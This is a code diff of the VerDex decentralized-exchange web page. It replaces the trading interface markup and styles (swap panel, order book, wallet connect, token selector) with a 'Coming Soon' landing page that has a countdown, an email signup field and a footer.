-      .ob-headers span:last-child {
-        text-align: right;
-      }
-      .ob-row {
-        display: grid;
-        grid-template-columns: 1fr 1fr 1fr;
-        padding: 4px 14px;
-        position: relative;
-        font-size: 0.73rem;
-        font-family: var(--font-mono);
-        transition: background 0.1s;
-      }
-      .ob-row:hover {
-        background: var(--grey2);
-      }
-      .ob-bar {
-        position: absolute;
-        top: 0;
-        bottom: 0;
-        right: 0;
-        opacity: 0.12;
-      }
-      .ob-row.ask .ob-bar {
-        background: var(--red);
-      }
-      .ob-row.bid .ob-bar {
-        background: var(--green);
-      }
-      .ob-row.ask .ob-price {
-        color: var(--red);
-      }
-      .ob-row.bid .ob-price {
-        color: var(--green);
-      }
-      .ob-row span:last-child {
-        text-align: right;
-        color: var(--text-dim);
-      }
-      .ob-spread {
-        text-align: center;
-        padding: 7px;
-        font-family: var(--font-mono);
-        font-size: 0.73rem;
-        color: var(--text-dim);
-        border-top: 1px solid var(--border);
-        border-bottom: 1px solid var(--border);
-      }
-      .ob-spread span {
-        color: var(--text);
-        font-weight: 700;
-      }
-      .rt-headers {
-        display: grid;
-        grid-template-columns: 1fr 1fr 1fr 1fr;
-        padding: 5px 14px;
-        font-size: 0.63rem;
-        color: var(--text-dim);
-        font-family: var(--font-mono);
-        text-transform: uppercase;
-        letter-spacing: 0.08em;
-        border-bottom: 1px solid var(--border);
-      }
-      .rt-headers span:last-child,
-      .rt-row span:last-child {
-        text-align: right;
-      }
-      .rt-row {
-        display: grid;
-        grid-template-columns: 1fr 1fr 1fr 1fr;
-        padding: 4px 14px;
-        font-size: 0.73rem;
-        font-family: var(--font-mono);
-      }
-      .rt-row:hover {
-        background: var(--grey2);
-      }
+    /* ── notify form ── */
+    .notify-form {
+      display: flex; gap: 10px; align-items: center;
+      margin-bottom: 48px; width: 100%; max-width: 420px;
+      opacity: 0; animation: fadeUp 0.7s 0.58s ease forwards;
+    }
+    .notify-input {
+      flex: 1;
+      background: var(--grey);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 13px 16px;
+      color: var(--text);
+      font-family: var(--font-m); font-size: 0.82rem;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    .notify-input::placeholder { color: var(--text-dim); }
+    .notify-input:focus {
+      border-color: var(--green-dim);
+      box-shadow: 0 0 14px rgba(0,255,127,0.12);
+    }
+    .notify-btn {
+      background: var(--green); color: var(--black);
+      font-family: var(--font-d); font-weight: 800; font-size: 0.88rem;
+      padding: 13px 24px; border: none; border-radius: 6px;
+      cursor: pointer; white-space: nowrap;
+      transition: transform 0.15s, box-shadow 0.15s;
+      box-shadow: 0 0 20px rgba(0,255,127,0.25);
+      position: relative; overflow: hidden;
+    }
+    .notify-btn:hover { transform: translateY(-2px); box-shadow: 0 0 32px rgba(0,255,127,0.45); }
 
-      /* ═══ SWAP PANEL ═══ */
-      .swap-panel {
-        width: 340px;
-        height: 100%;
-        flex-shrink: 0;
-      }
-      .swap-box {
-        background: var(--grey);
-        border: 1px solid var(--border);
-        border-radius: 12px;
-        overflow: hidden;
-        margin-bottom: 14px;
-      }
-      .swap-tabs {
-        display: flex;
-        border-bottom: 1px solid var(--border);
-      }
-      .swap-tab {
-        flex: 1;
-        padding: 13px;
-        text-align: center;
-        cursor: pointer;
-        font-weight: 700;
-        font-size: 0.87rem;
-        color: var(--text-dim);
-        background: transparent;
-        border: none;
-        transition: all 0.15s;
-      }
-      .swap-tab.active {
-        color: var(--green);
-        border-bottom: 2px solid var(--green);
-        background: rgba(0, 255, 127, 0.04);
-      }
-      .swap-body {
-        padding: 18px;
-      }
-      .swap-field {
-        background: var(--grey2);
-        border: 1px solid var(--border);
-        border-radius: 8px;
-        padding: 13px 15px;
-        margin-bottom: 8px;
-        transition: border-color 0.15s;
-      }
-      .swap-field:focus-within {
-        border-color: rgba(0, 255, 127, 0.4);
-      }
-      .swap-field-top {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        margin-bottom: 8px;
-      }
-      .swap-field-label {
-        font-size: 0.7rem;
-        color: var(--text-dim);
-        font-family: var(--font-mono);
-        text-transform: uppercase;
-        letter-spacing: 0.08em;
-      }
-      .swap-balance {
-        font-size: 0.7rem;
-        color: var(--text-dim);
-        font-family: var(--font-mono);
-      }
-      .swap-balance span {
-        color: var(--green);
-        cursor: pointer;
-      }
-      .swap-field-bottom {
-        display: flex;
-        align-items: center;
-        gap: 10px;
-      }
-      .swap-amount {
-        flex: 1;
-        background: transparent;
-        border: none;
-        outline: none;
-        font-family: var(--font-mono);
-        font-size: 1.35rem;
-        font-weight: 700;
-        color: var(--text);
-        width: 100%;
-      }
-      .swap-amount::placeholder {
-        color: var(--text-dim);
-      }
-      .swap-token-sel {
-        display: flex;
-        align-items: center;
-        gap: 7px;
-        background: var(--grey3);
-        border: 1px solid var(--border);
-        border-radius: 6px;
-        padding: 7px 11px;
-        cursor: pointer;
-        white-space: nowrap;
-        transition: background 0.12s;
-        font-weight: 700;
-        font-size: 0.86rem;
-        color: var(--text);
-        flex-shrink: 0;
-      }
-      .swap-token-sel:hover {
-        background: rgba(0, 255, 127, 0.07);
-      }
-      
-      /* ── token icon inside swap selector ── */
-      .tok-icon {
-        width: 22px;
-        height: 22px;
-        border-radius: 50%;
-        flex-shrink: 0;
-        object-fit: cover;
-        display: block;
-      }
-      .tok-icon-fallback {
-        width: 22px;
-        height: 22px;
-        border-radius: 50%;
-        flex-shrink: 0;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 0.5rem;
-        font-weight: 700;
-        color: #fff;
-      }
-      .swap-arrow-btn {
-        width: 34px;
-        height: 34px;
-        border-radius: 50%;
-        background: var(--grey2);
-        border: 1px solid var(--border);
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        cursor: pointer;
-        margin: -3px auto;
-        position: relative;
-        z-index: 2;
-        color: var(--green);
-        font-size: 1.1rem;
-        transition: all 0.2s;
-      }
-      .swap-arrow-btn:hover {
-        background: var(--green);
-        color: var(--black);
-        border-color: var(--green);
-        transform: rotate(180deg);
-      }
-      .swap-info {
-        background: var(--grey2);
-        border: 1px solid var(--border);
-        border-radius: 8px;
-        padding: 13px 15px;
-        margin-top: 10px;
-        margin-bottom: 14px;
-      }
-      .swap-info-row {
-        display: flex;
-        justify-content: space-between;
-        font-size: 0.76rem;
-        font-family: var(--font-mono);
-        color: var(--text-dim);
-        margin-bottom: 5px;
-      }
-      .swap-info-row:last-child {
-        margin-bottom: 0;
-      }
-      .swap-info-row span:last-child {
-        color: var(--text);
-      }
-      .btn-swap {
-        width: 100%;
-        padding: 15px;
-        background: var(--green);
-        color: var(--black);
-        font-family: var(--font-display);
-        font-weight: 800;
-        font-size: 1rem;
-        border: none;
-        border-radius: 8px;
-        cursor: pointer;
-        letter-spacing: -0.01em;
-        transition: all 0.15s;
-        box-shadow: 0 0 24px rgba(0, 255, 127, 0.25);
-      }
-      .btn-swap:hover {
-        transform: translateY(-1px);
-        box-shadow: 0 0 36px rgba(0, 255, 127, 0.4);
-      }
-      .slippage-row {
-        display: flex;
-        align-items: center;
-        gap: 7px;
-        margin-bottom: 14px;
-      }
-      .slip-label {
-        font-size: 0.7rem;
-        color: var(--text-dim);
-        font-family: var(--font-mono);
-        text-transform: uppercase;
-        letter-spacing: 0.08em;s
-        flex: 1;
-      }
-      .slip-btn {
-        padding: 4px 9px;
-        background: var(--grey2);
-        border: 1px solid var(--border);
-        border-radius: 4px;
-        color: var(--text-dim);
-        font-family: var(--font-mono);
-        font-size: 0.7rem;
-        cursor: pointer;
-        transition: all 0.12s;
-      }
-      .slip-btn.active,
-      .slip-btn:hover {
-        background: var(--green-glow);
-        color: var(--green);
-        border-color: var(--green-dark);
-      }
-      .slip-custom {
-        width: 50px;
-        padding: 4px 7px;
-        background: var(--grey2);
-        border: 1px solid var(--border);
-        border-radius: 4px;
-        color: var(--text);
-        font-family: var(--font-mono);
-        font-size: 0.7rem;
-        text-align: center;
-        outline: none;
-      }
-      .slip-custom:focus {
-        border-color: var(--green-dark);
-      }
-    /* ═══ TOKEN INFO PANEL ═══ */
-    .token-info-panel {
-        background: var(--grey);
-        border: 1px solid var(--border);
-        border-radius: 12px;
-        overflow: hidden;
-        margin-top: 25px;
-      }
-      .tip-header {
-        display: flex; align-items: center; gap: 5px;
-        padding: 14px 16px;
-        border-bottom: 1px solid var(--border);
-        background: rgba(0,255,127,0.03);
-      }
-      .tip-logo { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; }
-      .tip-logo-fallback { width: 32px; height: 32px; border-radius: 50%; background: var(--grey3); display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; color: var(--green); }
-      .tip-name { flex: 1; }
-      .tip-sym { font-weight: 800; font-size: 0.95rem; color: var(--text); display: block; }
-      .tip-fullname { font-size: 0.68rem; color: var(--text-dim); }
-      .tip-price-big { font-family: var(--font-mono); font-size: 1.3rem; font-weight: 700; color: var(--green); }
-      .tip-change-badge { font-family: var(--font-mono); font-size: 0.7rem; padding: 3px 8px; border-radius: 4px; font-weight: 700; }
-      .tip-change-badge.pos { background: rgba(0,255,127,0.12); color: var(--green); }
-      .tip-change-badge.neg { background: rgba(255,77,77,0.12); color: var(--red); }
-      .tip-stats { display: grid;  gap: 1px; background: var(--border); }
-      .tip-stat { padding: 5px 5px; background: var(--grey); }
-      .tip-stat-label { font-size: 0.62rem; color: var(--text-dim); font-family: var(--font-mono); text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 3px; }
-      .tip-stat-val { font-family: var(--font-mono); font-size: 0.82rem; font-weight: 700; color: var(--text); }
-      .tip-desc { padding: 12px 14px; font-size: 0.74rem; color: var(--text-dim); line-height: 1.55; border-top: 1px solid var(--border); }
-      
-      .tip-link { font-family: var(--font-mono); font-size: 0.65rem; padding: 5px 10px; border: 1px solid var(--border); border-radius: 4px; color: var(--text-dim); text-decoration: none; transition: all 0.15s; }
-      .tip-link:hover { color: var(--green); border-color: var(--green-dark); background: var(--green-glow); }
-      /* scrollbar */
-      ::-webkit-scrollbar {
-        width: 4px;
-      }
-      ::-webkit-scrollbar-track {
-        background: var(--grey);
-      }
-      ::-webkit-scrollbar-thumb {
-        background: var(--green-dark);
-        border-radius: 2px;
-      }
+    /* ── feature pills ── */
+    .features {
+      display: flex; flex-wrap: wrap; gap: 10px;
+      justify-content: center; max-width: 700px;
+      opacity: 0; animation: fadeUp 0.7s 0.68s ease forwards;
+    }
+    .feature-pill {
+      display: flex; align-items: center; gap: 7px;
+      font-family: var(--font-m); font-size: 0.68rem;
+      letter-spacing: 0.06em; text-transform: uppercase;
+      color: var(--text-dim);
+      border: 1px solid var(--border);
+      border-radius: 20px; padding: 6px 14px;
+      background: rgba(0,255,127,0.03);
+      transition: all 0.2s;
+    }
+    .feature-pill:hover { color: var(--green); border-color: rgba(0,255,127,0.3); }
+    .fp-dot { width: 5px; height: 5px; border-radius: 50%; background: var(--green); opacity: 0.7; }
 
-      /* ticker */
-      .ticker-tape {
-        overflow: hidden;
-        height: 34px;
-        background: var(--grey2);
-        border-bottom: 1px solid var(--border);
-        display: flex;
-        align-items: center;
-        position: sticky;
-        top: 0;
-        z-index: 99;
-      }
-      .ticker-inner {
-        display: flex;
-        animation: ticker 300s linear infinite;
-        white-space: nowrap;
-      }
-      .ticker-item {
-        display: inline-flex;
-        align-items: center;
-        gap: 6px;
-        padding: 0 22px;
-        font-family: var(--font-mono);
-        font-size: 0.7rem;
-        border-right: 1px solid var(--border);
-      }
-      .ticker-sym {
-        color: var(--text);
-        font-weight: 700;
-      }
-      @keyframes ticker {
-        0% {
-          transform: translateX(0);
-        }
-        100% {
-          transform: translateX(-50%);
-        }
-      }
+    .scan-line {
+      position: fixed; left: 0; right: 0; height: 2px;
+      background: linear-gradient(90deg, transparent, rgba(0,255,127,0.18), transparent);
+      pointer-events: none; z-index: 9997;
+      animation: scan 8s linear infinite;
+    }
+    @keyframes scan { 0%{top:-2px} 100%{top:100vh} }
 
-      .pulse-dot {
-        width: 6px;
-        height: 6px;
-        border-radius: 50%;
-        background: var(--green);
-        animation: pulse 2s ease-in-out infinite;
-        display: inline-block;
-      }
-      @keyframes pulse {
-        0%,
-        100% {
-          opacity: 1;
-          box-shadow: 0 0 0 0 rgba(0, 255, 127, 0.4);
-        }
-        50% {
-          opacity: 0.7;
-          box-shadow: 0 0 0 6px rgba(0, 255, 127, 0);
-        }
-      }
+    /* ════════════════════════
+       FOOTER
+    ════════════════════════ */
+    footer {
+      position: relative; z-index: 10;
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 24px 52px;
+      border-top: 1px solid var(--border);
+      backdrop-filter: blur(6px);
+    }
+    .footer-copy {
+      font-family: var(--font-m); font-size: 0.68rem;
+      color: var(--text-dim); letter-spacing: 0.06em;
+    }
+    .footer-links { display: flex; gap: 24px; }
+    .footer-links a {
+      font-family: var(--font-m); font-size: 0.68rem;
+      color: var(--text-dim); text-decoration: none;
+      letter-spacing: 0.06em; text-transform: uppercase;
+      transition: color 0.2s;
+    }
+    .footer-links a:hover { color: var(--green); }
 
-      /* ═══ MOBILE OVERLAY (sidebar slides over content) ═══ */
-      /* On mobile the sidebar is hidden by default; toggle overlays it */
-      @media (max-width: 900px) {
-        nav {
-          padding: 16px 20px;
-        }
-        .nav-links {
-          display: none;
-        }
-        .stats-bar {
-          gap: 24px;
-          flex-wrap: wrap;
-          padding: 20px;
-        }
-        .app-header {
-          padding: 12px 16px;
-        }
-        .app-center-nav {
-          display: none;
-        }
-        .nav-hamburger {
-          display: flex;
-        }
-        /* sidebar becomes a fixed overlay on mobile */
-        .sidebar {
-          position: fixed;
-          top: 0;
-          left: 0;
-          bottom: 0;
-          z-index: 250;
-          width: var(--sidebar-w);
-          /* hidden off-screen by default on mobile */
-          transform: translateX(-100%);
-          opacity: 1;
-          transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-          box-shadow: none;
-        }
-        /* when open on mobile: slide in */
-        .sidebar.mobile-open {
-          transform: translateX(0);
-          box-shadow: 6px 0 32px rgba(0, 0, 0, 0.7);
-        }
-        /* toggle always visible at left edge on mobile */
-        .sidebar-toggle {
-          left: 0 !important;
-          border-left: 1px solid var(--border);
-          border-right: none;
-          border-radius: 0 7px 7px 0;
-        }
-        /* when sidebar is open on mobile, toggle moves with it */
-        .sidebar-toggle.mobile-open {
-          left: var(--sidebar-w) !important;
-          border-left: none;
-          border-right: 1px solid var(--border);
-          border-radius: 0 7px 7px 0;
-        }
+    /* ── side labels ── */
+    .side-label {
+      position: fixed; z-index: 10;
+      font-family: var(--font-m); font-size: 0.6rem;
+      letter-spacing: 0.18em; text-transform: uppercase;
+      color: var(--text-dim);
+    }
+    .side-label-left  { left: 28px; top: 50%; transform: translateY(-50%) rotate(-90deg); transform-origin: center; }
+    .side-label-right { right: 28px; top: 50%; transform: translateY(-50%) rotate(90deg); transform-origin: center; }
 
-        /* mobile overlay backdrop */
-        .sidebar-backdrop {
-          display: none;
-          position: fixed;
-          inset: 0;
-          background: rgba(0, 0, 0, 0.6);
-          z-index: 240;
-        }
-        .sidebar-backdrop.show {
-          display: block;
-        }
+    .corner {
+      position: fixed; z-index: 10;
+      width: 20px; height: 20px; pointer-events: none;
+    }
+    .corner::before, .corner::after {
+      content: ''; position: absolute;
+      background: var(--green-dim); opacity: 0.5;
+    }
+    .corner::before { height: 1px; width: 100%; top: 0; left: 0; }
+    .corner::after  { width: 1px;  height: 100%; top: 0; left: 0; }
+    .corner-tl { top: 18px; left: 18px; }
+    .corner-tr { top: 18px; right: 18px; transform: scaleX(-1); }
+    .corner-bl { bottom: 18px; left: 18px; transform: scaleY(-1); }
+    .corner-br { bottom: 18px; right: 18px; transform: scale(-1,-1); }
 
-        /* swap panel full width */
-        .swap-panel {
-          width: 100%;
-        }
-        .main-content {
-          flex-direction: column;
-          padding: 12px;
-        }
-        .market-stats {
-          grid-template-columns: 1fr 1fr;
-        }
-      }
+    @keyframes fadeUp {
+      from { opacity:0; transform: translateY(22px); }
+      to   { opacity:1; transform: translateY(0); }
+    }
 
-      /* ═══ TOKEN MODAL ═══ */
-      #tokenModal {
-        display: none;
-        position: fixed;
-        inset: 0;
-        background: rgba(0, 0, 0, 0.85);
-        z-index: 1000;
-        align-items: center;
-        justify-content: center;
-        backdrop-filter: blur(6px);
-      }
-      .modal-box {
-        background: #1a1a1a;
-        border: 1px solid rgba(255, 255, 255, 0.1);
-        border-radius: 16px;
-        width: 400px;
-        max-height: 560px;
-        display: flex;
-        flex-direction: column;
-        overflow: hidden;
-        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
-      }
-      .modal-head {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        padding: 20px;
-      }
-      .modal-close {
-        cursor: pointer;
-        color: #666;
-        font-size: 1.2rem;
-      }
-      .modal-search-wrap {
-        padding: 0 10px 12px;
-      }
-      .modal-search {
-        width: 100%;
-        background: rgba(0, 0, 0, 0.2);
-        border: 1px solid rgba(255, 255, 255, 0.1);
-        border-radius: 8px;
-        padding: 10px 14px;
-        color: #fff;
-        font-size: 0.85rem;
-        outline: none;
-        box-sizing: border-box;
-        font-family: var(--font-mono);
-      }
-      .modal-search:focus {
-        border-color: rgba(0, 255, 127, 0.4);
-      }
-      #modalTokenList {
-        overflow-y: auto;
-        flex: 1;
-        padding: 0 12px 20px;
-      }
-      .modal-token-row {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        padding: 10px;
-        cursor: pointer;
-        border-radius: 8px;
-        transition: background 0.1s;
-      }
-      .modal-token-row:hover {
-        background: rgba(255, 255, 255, 0.05);
-      }
+    /* ── responsive ── */
+    @media (max-width: 768px) {
+      nav, footer { padding: 20px; }
+      footer { flex-direction: column; gap: 16px; }
+      .side-label, .corner { display: none; }
+      .countdown-wrap { gap: 12px; }
+      .cd-num { width: 70px; height: 65px; font-size: 2rem; }
+      .headline { font-size: 3.5rem; }
+      .notify-form { flex-direction: column; }
+      .notify-input, .notify-btn { width: 100%; }
+    }
+  </style>
+</head>
+<body>
 
-      /* No-wallet notice for Chrome mobile */
-      .nowallet-notice {
-        font-size: 0.75rem;
-        color: var(--text-dim);
-        font-family: var(--font-mono);
-        margin-top: 8px;
-        text-align: center;
-        padding: 8px 12px;
-        background: rgba(0, 255, 127, 0.05);
-        border: 1px solid var(--border);
-        border-radius: 6px;
-        display: none;
-      }
-    </style>
-  </head>
-  <body>
-    <!-- ═══════════ LANDING ═══════════ -->
-    <div id="landing">
-      <div class="orb orb1"></div>
-      <div class="orb orb2"></div>
-      <nav>
-        <div class="nav-logo">
-          <div class="logo-diamond"></div>
-          VerDex
-        </div>
-        <ul class="nav-links">
-          <li><a href="docs.html">Docs</a></li>
-          <li><a href="token.html">VDXT Token</a></li>
-          <li><a href="governance.html">Governance</a></li>
-          <li><a href="referral.html">Referral Program</a></li>
-        </ul>
-        <button class="nav-hamburger" id="landingHamburger" onclick="toggleLandingMenu()" aria-label="Menu">
-          <span></span><span></span><span></span>
-        </button>
-      </nav>
-      <!-- Landing mobile dropdown -->
-      <div class="nav-dropdown" id="landingNavDropdown">
-        <a href="docs.html">Docs</a>
-        <a href="token.html">VDXT Token</a>
-        <a href="governance.html">Governance</a>
-        <a href="referral.html">Referral Program</a>
-        <button class="dropdown-connect" onclick="launchApp();closeLandingMenu()">Launch App →</button>
-      </div>
-      <div class="hero">
-        <div class="hero-eyebrow">Next-Gen Decentralized Exchange</div>
-        <h1 class="hero-title">Swap.<br /><span>Earn. Evolve.</span></h1>
-        <p class="hero-sub">
-          Trade any token at real-time market prices with zero intermediaries.
-          Ultra-low fees, deep liquidity, and total on-chain transparency.
-        </p>
-        <div class="hero-cta-row">
-          <button class="btn-launch" onclick="launchApp()">Launch App →</button>
-          <button class="btn-ghost" onclick="window.location.href='docs.html'">
-            Read the Docs
-          </button>
-        </div>
-      </div>
-     
-      </div>
+  <div class="radial-bg"></div>
+  <div class="orb orb-1"></div>
+  <div class="orb orb-2"></div>
+  <div class="orb orb-3"></div>
+  <div class="scan-line"></div>
+
+  <div class="corner corner-tl"></div>
+  <div class="corner corner-tr"></div>
+  <div class="corner corner-bl"></div>
+  <div class="corner corner-br"></div>
+
+  <span class="side-label side-label-left">Decentralized Exchange · BSC Mainnet</span>
+  <span class="side-label side-label-right">verdex.io · 2026</span>
+
+  <nav>
+    <a href="#" class="logo">
+      <div class="logo-diamond"></div>
+      VerDex
+    </a>
+    <div class="nav-badge">
+      <span style="width:6px;height:6px;border-radius:50%;background:var(--green);display:inline-block;animation:csPulse 1.5s infinite;"></span>
+      Building in Progress
     </div>
-    <!-- ═══════════ APP ═══════════ -->
-    
-    <div id="app">
-      <div class="ticker-tape">
-        <div class="ticker-inner" id="tickerInner"></div>
+  </nav>
+
+  <main>
+    <div class="eyebrow">Next-Gen Decentralized Exchange</div>
+
+    <h1 class="headline">
+      The Future of<br/>
+      <span class="accent">DeFi Trading.</span>
+    </h1>
+
+    <div class="coming-soon-tag">
+      <span class="cs-dot"></span>
+      Coming Soon
+      <span class="cs-dot"></span>
+    </div>
+
+    <p class="sub">
+      VerDex is being built for those who don't compromise — real-time prices,
+      deep liquidity, and zero intermediaries.
+    </p>
+
+    <div class="countdown-wrap" id="countdown">
+      <div class="cd-unit">
+        <div class="cd-num" id="cd-days">00</div>
+        <div class="cd-label">Days</div>
       </div>
-      <div class="app-header">
-        <div class="app-logo" onclick="backToLanding()">
-          <div class="logo-diamond"></div>
-          VerDex
-        </div>
-
-         <!-- ── Center nav ── -->
-         <div class="app-center-nav">
-          <a class="app-nav-link" href="docs.html" target="_blank">Docs</a>
-          <a class="app-nav-link" href="token.html" target="_blank">VDXT Token</a>
-          <a class="app-nav-link" href="governance.html" target="_blank">Governance</a>
-          <a class="app-nav-link" href="referral.html" target="_blank">Referral</a>
-        </div>
-        <div style="display:flex;align-items:center;gap:10px;">
-          <button class="btn-connect" id="connectBtn">Connect Wallet</button>
-          <button class="nav-hamburger" id="appHamburger" onclick="toggleAppMenu()" aria-label="Menu">
-            <span></span><span></span><span></span>
-          </button>
-        </div>
+      <div class="cd-sep">:</div>
+      <div class="cd-unit">
+        <div class="cd-num" id="cd-hours">00</div>
+        <div class="cd-label">Hours</div>
       </div>
- <!-- Mobile dropdown -->
- <div class="app-nav-dropdown" id="appNavDropdown">
-  <a href="docs.html" target="_blank">Docs</a>
-  <a href="token.html" target="_blank">VDXT Token</a>
-  <a href="governance.html" target="_blank">Governance</a>
-  <a href="referral.html" target="_blank">Referral</a>
-  <button class="dropdown-connect" id="dropdownConnectBtn" onclick="toggleConnect();closeAppMenu()">Connect Wallet</button>
-</div>
-    <div class="app-body">
-      <!-- Mobile backdrop (closes sidebar) -->
-      <div
-        class="sidebar-backdrop"
-        id="sidebarBackdrop"
-        onclick="closeSidebarMobile()"
-      ></div>
-
-
-        <!-- Toggle button -->
-        <button
-          class="sidebar-toggle"
-          id="sidebarToggle"
-          onclick="toggleSidebar()"
-          title="Toggle markets"
-        >
-          <span class="toggle-arrow">&#8249;</span>
-        </button>
-
-        <!-- ═══ SIDEBAR ═══ -->
-        <div class="sidebar" id="appSidebar">
-          <div class="sidebar-header">
-            <div class="sidebar-top-row">
-              <span class="sidebar-label">Markets</span>
-              <span class="pulse-dot"></span>
-            </div>
-            <!-- SEARCH BOX -->
-            <input
-              type="text"
-              id="sidebarSearch"
-              class="sidebar-search"
-              placeholder="Search tokens…"
-              oninput="filterSidebar()"
-              autocomplete="off"
-            />
-          </div>
-          <div id="tokenList"></div>
-        </div>
-
-        <!-- Main content -->
-        <div class="main-content">
-          <div class="chart-section">
-            <!-- Chart -->
-            <div class="chart-box" style="height: 520px">
-              <div
-                id="tradingview_dex_chart"
-                style="height: 100%; width: 100%"
-              ></div>
-            </div>
-
-            <!-- Order book + recent trades -->
-            <div
-              style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px"
-            >
-              <div class="order-book">
-                <div class="ob-title">Order Book</div>
-                <div class="ob-headers">
-                  <span>Price</span><span>Amount</span
-                  ><span style="text-align: right">Total</span>
-                </div>
-                <div id="obAsks"></div>
-                <div class="ob-spread">
-                  Spread: <span id="obSpread">—</span>
-                </div>
-                <div id="obBids"></div>
-              </div>
-              <div class="recent-trades">
-                <div class="rt-title">Recent Trades</div>
-                <div class="rt-headers">
-                  <span>Price</span><span>Amount</span><span>Time</span
-                  ><span>Type</span>
-                </div>
-                <div id="recentTradesList"></div>
-              </div>
-            </div>
-          </div>
-
-          <!-- Swap Panel -->
-          <div class="swap-panel">
-            <div class="swap-box">
-              <div class="swap-tabs">
-                <button class="swap-tab active" onclick="setSwapTab(this)">
-                  Swap Panel
-                </button>
-              </div>
-              <div class="swap-body">
-                <!-- From -->
-                <div class="swap-field">
-                  <div class="swap-field-top">
-                    <span class="swap-field-label">You Pay</span>
-                    <div style="display: flex; align-items: center; gap: 6px">
-                      <span
-                        class="swap-balance"
-                        style="
-                          font-size: 0.7rem;
-                          color: var(--text-dim);
-                          font-family: var(--font-mono);
-                        "
-                      >
-                        Bal:
-                        <span
-                          id="fromBalanceDisplay"
-                          style="color: var(--green)"
-                          >—</span
-                        >
-                      </span>
-                      <button
-                        id="maxBtn"
-                        onclick="setMax()"
-                        style="
-                          background: rgba(0, 255, 127, 0.12);
-                          border: 1px solid var(--green-dark);
-                          color: var(--green);
-                          font-family: var(--font-mono);
-                          font-size: 0.62rem;
-                          font-weight: 700;
-                          padding: 2px 7px;
-                          border-radius: 4px;
-                          cursor: pointer;
-                          transition: all 0.15s;
-                          letter-spacing: 0.04em;
-                        "
-                        onmouseover="this.style.background='var(--green)';this.style.color='var(--black)'"
-                        onmouseout="this.style.background='rgba(0,255,127,0.12)';this.style.color='var(--green)'"
-                      >
-                        MAX
-                      </button>
-                    </div>
-                  </div>
-                  <div class="swap-field-bottom">
-                    <input
-                      class="swap-amount"
-                      id="fromAmt"
-                      type="number"
-                      placeholder="0.0"
-                      oninput="calcSwap()"
-                    />
-                    <div
-                      class="swap-token-sel"
-                      onclick="openTokenModal('from')"
-                    >
-                      <span id="fromIconWrap"></span>
-                      <span id="fromSym">ETH</span>
-                      <span style="color: var(--text-dim); font-size: 0.78rem"
-                        >▾</span
-                      >
-                    </div>
-                  </div>
-                  <div
-                    style="
-                      font-size: 0.7rem;
-                      color: var(--text-dim);
-                      font-family: var(--font-mono);
-                      margin-top: 5px;
-                    "
-                    id="fromUSD"
-                  >
-                    ≈ $0.00
-                  </div>
-                </div>
-
-                <!-- Arrow -->
-                <div style="text-align: center; margin: 3px 0">
-                  <div class="swap-arrow-btn" onclick="flipTokens()">⇅</div>
-                </div>
-
-                <!-- To -->
-                <div class="swap-field">
-                  <div class="swap-field-top">
-                    <span class="swap-field-label">You Receive</span>
-                    <span
-                      class="swap-balance"
-                      style="
-                        font-size: 0.7rem;
-                        color: var(--text-dim);
-                        font-family: var(--font-mono);
-                      "
-                    >
-                      Bal:
-                      <span id="toBalanceDisplay" style="color: var(--green)"
-                        >—</span
-                      >
-                    </span>
-                  </div>
-                  <div class="swap-field-bottom">
-                    <input
-                      class="swap-amount"
-                      id="toAmt"
-                      type="number"
-                      placeholder="0.0"
-                      readonly
-                    />
-                    <div class="swap-token-sel" onclick="openTokenModal('to')">
-                      <span id="toIconWrap"></span>
-                      <span id="toSym">USDT</span>
-                      <span style="color: var(--text-dim); font-size: 0.78rem"
-                        >▾</span
-                      >
-                    </div>
-                  </div>
-                  <div
-                    style="
-                      font-size: 0.7rem;
-                      color: var(--text-dim);
-                      font-family: var(--font-mono);
-                      margin-top: 5px;
-                    "
-                    id="toUSD"
-                  >
-                    ≈ $0.00
-                  </div>
-                </div>
-
-                <!-- Slippage -->
-                <div class="slippage-row" style="margin-top: 12px">
-                  <span class="slip-label">Slippage</span>
-                  <button class="slip-btn active" onclick="setSlip(this)">
-                    0.1%
-                  </button>
-                  <button class="slip-btn" onclick="setSlip(this)">0.5%</button>
-                  <button class="slip-btn" onclick="setSlip(this)">1.0%</button>
-                  <input
-                    class="slip-custom"
-                    id="slipCustom"
-                    placeholder="%"
-                    type="number"
-                  />
-                </div>
-
-                <!-- Info -->
-                <div class="swap-info">
-                  <div class="swap-info-row">
-                    <span>Rate</span><span id="swapRate">—</span>
-                  </div>
-                  <div class="swap-info-row">
-                    <span>Balance</span><span id="fromBalance">0.00</span>
-                  </div>
-                  <div class="swap-info-row">
-                    <span>Price Impact</span><span id="priceImpact">—</span>
-                  </div>
-                  <div class="swap-info-row">
-                    <span>Network Fee</span><span id="networkFee">—</span>
-                  </div>
-                  <div class="swap-info-row">
-                    <span>Min. Received</span><span id="minReceived">—</span>
-                  </div>
-                  <div class="swap-info-row">
-                    <span>Route</span
-                    ><span id="swapRoute" style="color: var(--green)">—</span>
-                  </div>
-                </div>
-
-                <button class="btn-swap" onclick="executeSwap()">
-                  Swap Tokens
-                </button>
-                <!-- shown on mobile Chrome when no wallet detected -->
-                <div class="nowallet-notice" id="noWalletNotice">
-                  No wallet detected. Open in MetaMask browser or install the
-                  MetaMask extension.
-                </div>
-                  <!-- ═══ TOKEN INFO PANEL ═══ -->
-            <div class="token-info-panel" id="tokenInfoPanel">
-              <div class="tip-header">
-                <div id="tipLogoWrap"></div>
-                <div class="tip-name">
-                  <span class="tip-sym" id="tipSym">—</span>
-                  <span class="tip-fullname" id="tipFullName">—</span>
-                </div>
-                <div style="text-align:right">
-                  <div class="tip-price-big" id="tipPrice">$—</div>
-                  <span class="tip-change-badge pos" id="tipChangeBadge">—</span>
-                </div>
-              </div>
-              <div class="tip-stats">
-                
-                <div class="tip-stat"><div class="tip-stat-label">24h Volume</div><div class="tip-stat-val" id="tipVol">—</div></div>
